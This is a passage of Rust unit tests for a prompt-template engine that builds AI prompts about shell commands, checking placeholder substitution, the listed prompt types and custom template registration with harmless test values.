        let result = engine.render_template(template, &context);
        assert!(result.is_ok());
        
        let rendered = result.unwrap();
        assert!(rendered.contains("test_cmd"));
        assert!(rendered.contains("/test_dir"));
        assert!(rendered.contains("test_shell"));
        assert!(rendered.contains("test_platform"));
        assert!(rendered.contains("42"));
        assert!(rendered.contains("test_output"));
        assert!(rendered.contains("test_error"));
        assert!(rendered.contains("test_session"));
        assert!(rendered.contains("prev1, prev2"));
    }

    #[test]
    fn test_available_prompt_types() {
        let engine = PromptEngine::new();
        let available_types = engine.available_prompt_types();
        
        assert!(!available_types.is_empty());
        assert!(available_types.contains(&PromptType::CommandExplanation));
        assert!(available_types.contains(&PromptType::ErrorDiagnosis));
        assert!(available_types.contains(&PromptType::WorkflowDocumentation));
    }

    #[test]
    fn test_add_custom_template() {
        let mut engine = PromptEngine::new();
        
        let custom_template = PromptTemplate {
            system_prompt: "Custom system prompt".to_string(),
            user_prompt_template: "Custom user prompt: {{command}}".to_string(),
            context_variables: vec!["command".to_string()],
        };
        
        engine.add_template(PromptType::PerformanceAnalysis, custom_template);
        
        let context = PromptContext {
            command: "test command".to_string(),
            working_directory: "/test".to_string(),
            shell: "bash".to_string(),
            exit_code: Some(0),
            output: None,
            error: None,
            previous_commands: vec![],
            session_description: None,
            platform: "linux".to_string(),
        };
        
        let result = engine.generate_prompt(PromptType::PerformanceAnalysis, &context);
        assert!(result.is_ok());
        
        let (system_prompt, user_prompt) = result.unwrap();
        assert_eq!(system_prompt, "Custom system prompt");
        assert!(user_prompt.contains("Custom user prompt: test command"));
    }
}